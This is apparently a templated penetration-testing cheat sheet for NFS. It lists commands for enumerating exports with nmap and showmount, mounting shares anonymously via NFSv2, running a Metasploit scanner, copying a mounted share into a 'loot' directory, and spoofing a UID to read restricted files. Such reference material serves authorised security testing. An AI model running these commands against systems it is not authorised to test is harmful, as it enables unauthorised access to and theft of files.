# NFS
> Network File System enumeration, mounting, and exploitation
<!-- tags: nfs,filesystem,share,enumeration -->

---

## scan nfs nmap nse
Enumerate NFS exports, stats, and ACLs.

```bash
nmap -p 2049 --script "nfs-ls,nfs-statfs,nfs-showmount" {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=nfs,nmap,enum -->

---

## list nfs exports showmount
List exported shares from NFS server.

```bash
showmount -e {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=nfs,showmount,exports -->

---

## mount nfs share
Mount remote NFS share on local mount point.

```bash
sudo mount -t nfs {{TARGET:ip}}:{{REMOTE_PATH:str:/share}} {{MOUNT_POINT:dir:/mnt/nfs}} -o nolock
```

<!-- meta: risk=low | phase=enum | tags=nfs,mount -->

---

## mount nfsv2 anonymous
Force NFSv2 (no auth) when possible.

```bash
sudo mount -t nfs -o vers=2 {{TARGET:ip}}:{{REMOTE_PATH:str:/share}} {{MOUNT_POINT:dir:/mnt/nfs}} -o nolock
```

<!-- meta: risk=med | phase=enum | tags=nfs,nfsv2,unauth -->

---

## unmount nfs share
Force lazy unmount of NFS share.

```bash
sudo umount -lf {{MOUNT_POINT:dir:/mnt/nfs}}
```

<!-- meta: risk=safe | phase=misc | tags=nfs,umount -->

---

## copy mounted share loot
Pull all data from mount for offline review.

```bash
cp -r {{MOUNT_POINT:dir:/mnt/nfs}}/ {{LOOT_DIR:dir:./nfs-loot}}
```

<!-- meta: risk=med | phase=post | tags=nfs,exfil,loot -->

---

## scan nfs mounts metasploit
Use Metasploit auxiliary scanner for NFS hosts.

```bash
msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS {{TARGET:ip}}; run; exit"
```

<!-- meta: risk=safe | phase=recon | tags=nfs,metasploit,scanner -->

---

## spoof uid no_root_squash privesc
Create a local user matching remote UID for file access via no_root_squash bypass.

```bash
sudo useradd -u {{UID:int:1000}} {{USERNAME:str:nfsuser}}
sudo su - {{USERNAME:str:nfsuser}}
ls -la {{MOUNT_POINT:dir:/mnt/nfs}}/restricted
```

<!-- meta: risk=med | phase=exploit | tags=nfs,uid,spoof,privesc -->
